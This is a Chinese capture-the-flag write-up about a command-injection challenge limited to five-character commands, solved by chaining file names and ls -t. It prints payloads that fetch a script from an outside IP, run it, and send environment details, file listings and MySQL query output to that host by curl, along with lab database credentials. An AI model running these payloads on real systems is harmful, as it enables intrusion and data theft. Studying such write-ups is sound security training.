...
the_hs
                    the_hs  看雪学苑   2026-09-23 09:59  
  
我愿称之为“第三方 WP 都只差最后半步”的一题。  
  
  
原题本身并不新，核心还是利用长度不超过 5 的命令，通过文件名、续行符和 ls -t  
 拼出长命令。  
...
```
serverAddr = "11.4.5.14"serverPort = 7000auth.token = "********"[[proxies]]name = "ctf_http_80"type = "tcp"localIP = "127.0.0.1"localPort = 8000remotePort = 80
```  
...
但是看雪靶机前面有网关反代，PHP 看到的 REMOTE_ADDR  
 是网关内网地址，而不是攻击者出口 IP。  
...
 也会把 _  
、g  
 自身以及第一阶段的残留文件列进去，但这些多余行会因续行符拼接成无效命令而报错，不影响有效命令的执行。  
...
```
cu\rl\ 1\1.\4.\5.\14\ -\o\ x
```  
  
  
  
由于 ls -t  
 是新文件在前，所以实际创建文件时要反过来，从最后一段开始创建：  
  
```
>\ x>o\>\ -\>14\>5.\>4.\>1.\>\ 1\>rl\>cu\
```  
...
```
#!/bin/sh{echo '=== pwd/id/env ==='pwdidenvecho '=== root ==='ls -la /echo '=== readme ==='cat /README.txt 2>/dev/nullecho '=== mysql ==='command -v mysql || true} 2>&1 | curl --data-binary @- http://11.4.5.14/upload
```  
...
```
/www/sandbox/3a5463e2cd4fa054a8bc44da1b1bbcaauid=33(www-data) gid=33(www-data)
```  
...
```
#!/bin/sh{echo '=== databases ==='  mysql -ufl4444g -pSugZXUtgeJ52_Bvr \    -e 'show databases;'echo '=== flag ==='  mysql -ufl4444g -pSugZXUtgeJ52_Bvr \    -e 'SELECT * FROM fl4gdb.this_is_the_fl4g;'} 2>&1 | curl --data-binary @- http://11.4.5.14/upload
```  
...
```
Databaseinformation_schemafl4gdbmysqlperformance_schemasys
```  
...
```
secretflag{43a0eac7-3bb6-471a-864d-2a75b894c8b9}
```  
...
```
文件名 + 续行符        ↓构造 ls -t>g        ↓用 ls -t 拼出 curl IP -o x        ↓下载 payload 到 x        ↓sh x        ↓curl POST 回显        ↓README 获取 MySQL 凭据        ↓查询 fl4gdb.this_is_the_fl4g
```  
